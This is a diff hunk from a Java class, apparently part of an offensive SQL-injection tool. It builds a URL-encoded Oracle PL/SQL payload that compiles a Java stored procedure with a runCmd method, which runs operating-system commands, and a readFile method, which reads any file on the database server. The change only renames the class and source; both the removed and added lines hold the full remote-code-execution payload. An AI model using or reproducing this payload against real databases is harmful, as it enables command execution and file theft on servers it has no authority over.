@@ -67,8 +67,8 @@ public class UdfAccess {
             "BEGIN",
             "\\n",
             "EXECUTE IMMEDIATE 'create or replace and compile java source named \"",
-            UdfAccess.RCE_JAVA_UTIL_SRC, "_SRC",
-            "\" as import java.io.*; public class ", UdfAccess.RCE_JAVA_UTIL_SRC, "_SRC{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';",
+            UdfAccess.RCE_JAVA_UTIL_SRC,
+            "\" as import java.io.*; public class ", UdfAccess.RCE_JAVA_UTIL_SRC, "{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';",
             "\\n",
             "END;"
         )), "body#create-src");
